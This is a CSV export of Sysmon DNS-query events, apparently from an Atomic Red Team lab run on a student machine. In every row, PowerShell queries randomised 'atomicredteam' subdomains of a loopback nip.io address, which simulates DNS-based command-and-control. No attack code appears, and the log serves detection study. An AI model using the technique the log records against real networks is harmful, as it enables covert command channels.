"2025-12-26 11:26:59.444 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174245,"Query: atomicredteam-37562.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.177","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.444 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174246,"Query: atomicredteam-959963.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.444 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174247,"Query: atomicredteam-607543.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.291","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.445 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174248,"Query: atomicredteam-675589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.329","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.502 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174249,"Query: atomicredteam-859884.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.374","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.502 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174250,"Query: atomicredteam-956537.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.502 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174251,"Query: atomicredteam-438198.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.459","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.502 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174252,"Query: atomicredteam-118651.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.506","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.503 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174253,"Query: atomicredteam-359417.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.849","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.503 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174254,"Query: atomicredteam-674893.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.032","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.503 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174255,"Query: atomicredteam-651884.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.111","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:00.504 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174256,"Query: atomicredteam-926600.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.475 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174257,"Query: atomicredteam-606684.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.326","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.475 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174258,"Query: atomicredteam-713887.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.364","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.475 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174259,"Query: atomicredteam-325772.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.711","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.475 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174260,"Query: atomicredteam-379432.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.475 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174261,"Query: atomicredteam-552357.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.795","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.477 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174262,"Query: atomicredteam-717395.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.835","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.479 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174263,"Query: atomicredteam-337478.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:00.878","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.479 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174264,"Query: atomicredteam-777511.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.061","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.479 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174265,"Query: atomicredteam-711695.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.235","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.479 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174266,"Query: atomicredteam-179283.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.273","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.479 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174267,"Query: atomicredteam-40011.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.329","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.480 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174268,"Query: atomicredteam-911905.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.368","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:01.480 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174269,"Query: atomicredteam-637517.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.407","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174270,"Query: atomicredteam-700661.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.473","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174271,"Query: atomicredteam-879704.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.518","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174272,"Query: atomicredteam-639410.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.557","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174273,"Query: atomicredteam-731271.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.595","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174274,"Query: atomicredteam-809555.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.663","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174275,"Query: atomicredteam-404599.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.714","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174276,"Query: atomicredteam-380115.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.752","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174277,"Query: atomicredteam-706886.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.790","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174278,"Query: atomicredteam-381939.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.835","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.605 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174279,"Query: atomicredteam-684084.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.896","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.606 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174280,"Query: atomicredteam-492844.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:01.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.606 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174281,"Query: atomicredteam-125299.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:02.128","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174282,"Query: atomicredteam-309972.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:02.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:02.608 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174283,"Query: atomicredteam-132668.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:02.319","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:03.624 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174284,"Query: atomicredteam-584805.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:02.640","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:03.624 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174285,"Query: atomicredteam-491616.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:02.688","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:03.636 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174286,"Query: atomicredteam-863202.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:02.871","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:03.636 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174287,"Query: atomicredteam-88435.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.028","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:03.636 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174288,"Query: atomicredteam-663410.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:03.636 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174289,"Query: atomicredteam-375254.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.106","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174290,"Query: atomicredteam-918899.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.458","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174291,"Query: atomicredteam-125570.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.637","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174292,"Query: atomicredteam-842888.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.747","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
